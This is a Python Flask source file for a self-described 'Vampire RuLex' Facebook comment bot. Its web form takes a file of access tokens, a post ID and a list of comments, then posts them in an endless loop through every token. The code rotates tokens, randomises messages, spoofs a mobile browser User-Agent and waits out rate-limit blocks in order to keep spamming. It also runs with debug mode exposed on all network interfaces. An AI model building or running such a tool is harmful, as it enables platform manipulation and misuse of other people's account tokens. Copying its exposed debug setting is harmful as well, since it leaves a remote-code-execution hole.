from flask import Flask, request
import requests
from threading import Thread, Event
import time
import random
import logging

app = Flask(__name__)
app.debug = True

# Headers for Facebook Graph API
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []

logging.basicConfig(filename='bot.log', level=logging.INFO)

@app.route('/ping', methods=['GET'])
def ping():
    return "✅ I am alive!", 200

def send_comments(access_tokens, post_id, prefixes, time_interval, messages):
    while not stop_event.is_set():
        try:
            random.shuffle(messages)  # Randomize comments
            random.shuffle(access_tokens)  # Rotate tokens
            for message in messages:
                if stop_event.is_set():
                    break
                for access_token in access_tokens:
                    api_url = f'https://graph.facebook.com/v20.0/{post_id}/comments'
                    # Randomly select a prefix if prefixes list is not empty
                    prefix = random.choice(prefixes) if prefixes else ""
                    comment = f"{prefix} {message}" if prefix else message
                    parameters = {'access_token': access_token, 'message': comment}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        logging.info(f"✅ Comment Sent: {comment[:30]} via {access_token[:10]}")
                        print(f"✅ Comment Sent: {comment[:30]} via {access_token[:10]}")
                    else:
                        logging.error(f"❌ Fail [{response.status_code}]: {comment[:30]} - {response.text}")
                        print(f"❌ Fail [{response.status_code}]: {comment[:30]} - {response.text}")
                        if response.status_code in [400, 403]:
                            logging.warning("⚠️ Rate limit or restriction detected. Waiting 5 minutes...")
                            print("⚠️ Rate limit or restriction detected. Waiting 5 minutes...")
                            time.sleep(300)
                            continue
                    time.sleep(max(time_interval, 120))  # Minimum 120-second delay
        except Exception as e:
            logging.error(f"⚠️ Error in comment loop: {e}")
            print(f"⚠️ Error in comment loop: {e}")
            time.sleep(60)

@app.route('/', methods=['GET', 'POST'])
def send_comment():
    global threads
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()
        post_id = request.form.get('postId')
        # Get prefixes from textarea, split by newlines
        prefix_input = request.form.get('prefixes')
        prefixes = [p.strip() for p in prefix_input.splitlines() if p.strip()] if prefix_input else []
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_comments, args=(access_tokens, post_id, prefixes, time_interval, messages))
            thread.start()
            threads = [thread]

    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Vampire RuLex Comment Bot</title>
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
      <style>
        label { color: white; }
        .file { height: 30px; }
        body {
          background-image: url('https://i.postimg.cc/GpGTHHMj/2370de2b621af6e61d9117f31843df0c.jpg');
          background-size: cover;
          background-repeat: no-repeat;
          color: white;
        }
        .container {
          max-width: 350px;
          height: 650px;
          border-radius: 20px;
          padding: 20px;
          box-shadow: 0 0 15px white;
          border: none;
        }
        .form-control, .form-control-file {
          border: 1px double white;
          background: transparent;
          width: 100%;
          padding: 7px;
          margin-bottom: 20px;
          border-radius: 10px;
          color: white;
        }
        textarea.form-control {
          height: 100px;
        }
        .header { text-align: center; padding-bottom: 20px; }
        .btn-submit { width: 100%; margin-top: 10px; }
        .footer { text-align: center; margin-top: 20px; color: #888; }
      </style>
    </head>
    <body>
      <header class="header mt-4">
        <h1 class="mt-3">𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐑𝐔𝐋𝐄𝐗</h1>
      </header>
      <div class="container text-center">
        <form method="post" enctype="multipart/form-data">
          <label>Token File</label><input type="file" name="tokenFile" class="form-control form-control-file" required>
          <label>Post ID</label><input type="text" name="postId" class="form-control" required>
          <label>Comment Prefixes (Optional, one per line)</label>
          <textarea name="prefixes" class="form-control" placeholder="e.g., Kartik\nRam\nKumar"></textarea>
          <label>Delay (seconds)</label><input type="number" name="time" class="form-control" required>
          <label>Comments File</label><input type="file" name="txtFile" class="form-control form-control-file" required>
          <button type="submit" class="btn btn-primary btn-submit">Start Commenting</button>
        </form>
        <form method="post" action="/stop">
          <button type="submit" class="btn btn-danger btn-submit mt-3">Stop Commenting</button>
        </form>
      </div>
      <footer class="footer">
        <p>💀 Powered By Vampire Rulex</p>
        <p>😈 Any One Cannot Beat Me</p>
      </footer>
    </body>
    </html>
    '''

@app.route('/stop', methods=['POST'])
def stop_sending():
    stop_event.set()
    return '✅ Commenting stopped.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
